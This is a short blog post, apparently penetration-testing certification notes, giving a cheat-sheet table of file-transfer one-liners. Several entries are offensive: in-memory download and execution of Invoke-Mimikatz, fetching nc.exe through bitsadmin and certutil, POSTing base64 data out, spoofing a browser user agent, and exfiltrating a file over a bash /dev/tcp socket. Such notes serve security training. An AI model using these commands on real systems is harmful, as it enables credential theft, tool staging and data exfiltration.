---
layout: post
title: "File Transfers"
date: 2025-04-15
categories: CheatSheets/CPTS
order: 3
---

| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
| `nc -lvnp 8888 > file.db`<br>`cat file.db > /dev/tcp/10.10.10.10/8888` | Transfer a file using Netcat and bash TCP socket |
| `python -m http.server 1234`              | Python 3 built‑in static file server on port 1234       |
| `python -m SimpleHTTPServer 8000`         | Python 2 built‑in static file server on port 8000       |
| `php -S 0.0.0.0:1234`                     | PHP built‑in web server on port 1234                    |
| `ruby -run -e httpd . -p 1234`            | Ruby one‑liner HTTP server on port 1234                 |
| `npx http-server . -p 1234`               | Node.js “http-server” (via npx) on port 1234            |
| `busybox httpd -f -p 1234`                | BusyBox embedded HTTP server on port 1234               |
| `nc -l 1234 < index.html`                 | Simple one‑file serve via netcat on port 1234           |